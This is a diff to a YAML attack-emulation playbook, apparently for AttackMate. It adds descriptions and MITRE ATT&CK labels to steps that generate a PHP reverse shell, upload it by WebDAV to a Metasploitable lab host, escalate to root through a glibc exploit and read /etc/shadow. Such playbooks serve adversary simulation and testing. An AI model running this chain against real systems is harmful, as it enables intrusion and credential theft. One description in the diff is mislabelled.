@@ -22,6 +22,8 @@ vars:
 commands:
   - type: mktemp
     variable: RSHELL
+    metadata:
+      description: "Prepare directory for reverse shell"
 
   # generate reverse-shell
   - type: msf-payload
@@ -31,6 +33,8 @@ commands:
       LPORT: $LPORT
     format: raw
     local_path: ${RSHELL}.php
+    metadata:
+      description: "Generate php reverse shell"
 
   # start shell-listener in background
   - type: msf-module
@@ -42,12 +46,18 @@ commands:
       LPORT: $LPORT
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Start local listener for reverse shell"
 
   # upload shell via webdav
   - type: http-client
     cmd: PUT
     url: http://$METASPLOITABLE/dav/shell.php
     local_path: ${RSHELL}.php
+    metadata:
+      description: "Start local listener for reverse shell"
+      techniques: "T1190,T1105"
+      tactics: "Initial Access,Command and Control"
 
   # wait two seconds
   - type: sleep
@@ -59,6 +69,10 @@ commands:
     url: http://$METASPLOITABLE/dav/shell.php
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Trigger execution of php reverse shell"
+      techniques: "T1190,T1059"
+      tactics: "Initial Access,Execution"
 
   - type: sleep
     seconds: 10
@@ -68,13 +82,23 @@ commands:
     stdapi: True
     cmd: getuid
     session: shell
+    metadata:
+      description: "Verify shell access"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: sysinfo
     session: shell
+    metadata:
+      description: "Retrieve system information"
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: debug
     varstore: True
+    metadata:
+      description: "Print attackmate variables"
 
   - type: msf-module
     cmd: exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
@@ -84,11 +108,22 @@ commands:
       LHOST: $ATTACKER
       LPORT: "4448"
     session: shell
+    metadata:
+      description: "Gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library"
+      techniques: "T1068"
+      tactics: "Privilege Escalation"
 
   - type: msf-session
     cmd: getuid
     session: root
+    metadata:
+      description: "Verify shell access"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: cat /etc/shadow
     session: root
+    metadata:
+      techniques: "T1003.008"
+      tactics: "Credential Access"
